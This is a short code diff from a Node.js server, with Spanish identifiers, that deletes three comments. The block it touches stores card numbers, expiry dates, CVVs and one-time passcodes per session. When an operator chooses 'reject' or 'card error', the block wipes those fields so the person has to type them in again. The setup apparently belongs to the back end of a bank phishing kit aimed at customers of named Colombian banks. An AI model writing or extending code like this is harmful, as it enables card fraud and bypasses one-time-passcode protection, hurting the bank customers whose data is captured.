@@ -330,18 +330,15 @@ const server = http.createServer(async (req, res) => {
                 const estadoNuevo = mapEstados[accion];
                 estadoSesiones.set(sessionId, estadoNuevo);
                 
-                // 🔥 LÓGICA DE BORRADO DE DATOS
                 let datosActuales = datosSesiones.get(sessionId) || {};
                 const bancoKey = datosActuales.bancoKey || '';
                 const esTarjeta = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
 
                 if ((accion === 'RECHAZAR' || accion === 'CC_ERROR') && esTarjeta) {
-                    // Borramos número de tarjeta, fecha de vencimiento y CVV, pero dejamos titular y documento
                     datosActuales.tarjeta = '';
                     datosActuales.expMes = '';
                     datosActuales.expAnio = '';
                     datosActuales.cvv = '';
-                    // También borramos el OTP para que lo vuelvan a escribir
                     datosActuales.otp = '';
                     datosSesiones.set(sessionId, datosActuales);
                 }
